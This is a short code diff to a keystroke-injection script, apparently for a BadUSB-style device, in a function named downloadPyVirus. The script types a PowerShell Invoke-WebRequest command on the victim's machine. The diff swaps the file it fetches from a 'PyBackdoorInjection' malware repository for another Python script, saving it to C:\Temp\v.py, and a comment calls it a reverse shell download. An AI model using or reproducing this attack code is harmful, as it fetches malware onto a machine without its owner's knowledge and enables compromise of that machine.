@@ -8,7 +8,7 @@ function downloadPyVirus() {
 	enter();
 	delay(200);
 	// download reverse shell script from Nishang repository
-	type("IWR 'https://raw.githubusercontent.com/binexisHATT/EthicalHacking/master/PyMalware/PyBackdoorInjection/infect_pyfiles.py' -UseBasicParsing -OutFile 'C:\\Temp\\v.py'");
+	type("IWR 'https://github.com/leandrodax/PBTec/blob/main/obstruct_browsing.py' -UseBasicParsing -OutFile 'C:\\Temp\\v.py'");
 	enter();
 	delay(200);
 }
